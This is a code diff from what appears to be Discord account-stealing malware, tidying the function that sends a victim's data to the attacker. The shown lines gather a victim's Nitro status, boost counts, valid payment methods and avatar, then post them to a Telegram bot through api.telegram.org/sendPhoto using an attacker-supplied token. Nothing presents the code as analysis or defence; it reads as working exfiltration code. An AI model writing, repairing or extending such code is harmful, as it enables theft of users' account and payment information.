@@ -191,8 +191,6 @@ def main(telegram_token):
                         """
                         type += text
                         payment_methods += 1
-                print(type)
-                bot_token = telegram_token
                 print_nitro = f"\nNitro Informations:\nyaml\nHas Nitro: {has_nitro}\nExpiration Date: {exp_date}\nBoosts Available: {available}\n{print_boost if boost else ''}\n"
                 nnbutb = f"\nNitro Informations:\nBoosts Available: {available}\n{print_boost if boost else ''}\n```"
                 print_pm = f"\nPayment Methods:\nAmount: {payment_methods}\nValid Methods: {valid} method(s){type}"
@@ -206,7 +204,7 @@ def main(telegram_token):
                     """,
                     'photo': get_image(res_json['id'],res_json['avatar']),
                 }
-                telegram_api = f'https://api.telegram.org/bot{bot_token}'
+                telegram_api = f'https://api.telegram.org/bot{telegram_token}'
                 res = requests.post(telegram_api+'/sendPhoto',data=data)        
                 if res.status_code != 200:
                     print(res.json())
